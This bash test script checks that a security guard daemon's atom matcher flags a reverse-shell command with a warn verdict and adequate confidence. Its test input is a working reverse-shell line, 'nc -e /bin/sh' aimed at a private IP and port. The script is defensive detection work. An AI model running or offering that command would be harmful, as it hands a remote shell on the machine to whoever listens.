#!/usr/bin/env bash
# Tier-1 V2-G: Aho-Corasick atom matcher.
# Picks a known atom from `src/modules/security_guard/data/flagged_atoms.txt`
# and verifies the daemon flags it. Confidence per-atom is 0.6 by default;
# a single atom hit crosses WARN_THRESHOLD = 0.5 → Warn.

source "$(dirname "${BASH_SOURCE[0]}")/../lib/common.sh"

start_guard --tier2 stub

# `nc -e /bin/sh` is the canonical reverse-shell atom shipped in the
# default atom file. Predictable + recognisable.
classify "nc -e /bin/sh 10.0.0.1 4444"
expect_verdict warn
# AtomMatcher hits reuse Category::CurlPipeSh as the verdict bucket
# (deferred: dedicated AtomMatch category, see security-guard-design).
expect_category curl_pipe_sh
# Single-atom confidence: 0.6 per the atoms-file format. Allow some
# slop in case the value is tuned.
expect_confidence_ge 0.55

pass "Tier-1 atom matcher fires on `nc -e /bin/sh`"
